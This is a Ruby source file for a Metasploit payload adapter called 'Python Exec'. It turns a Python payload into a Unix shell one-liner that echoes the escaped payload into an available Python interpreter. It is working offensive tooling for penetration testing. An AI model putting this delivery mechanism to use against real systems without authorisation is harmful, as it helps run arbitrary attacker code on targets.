##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Python Exec',
        'Description' => 'Execute a Python payload as an OS command from a Posix-compatible shell',
        'Author' => 'Spencer McIntyre',
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_PYTHON,
        'AdaptedPlatform' => 'python'
      )
    )
  end

  def compatible?(mod)
    if mod.type == Msf::MODULE_PAYLOAD && mod.class.const_defined?(:CachedSize) && mod.class::CachedSize != :dynamic && (mod.class::CachedSize >= 120_000) # echo does not have an unlimited amount of space
      return false
    end

    super
  end

  def generate(_opts = {})
    payload = super

    if payload.include?("\n")
      payload = Msf::Payload::Python.create_exec_stub(payload)
    end

    "echo #{Shellwords.escape(payload)} | exec $(which python || which python3 || which python2) -"
  end
end
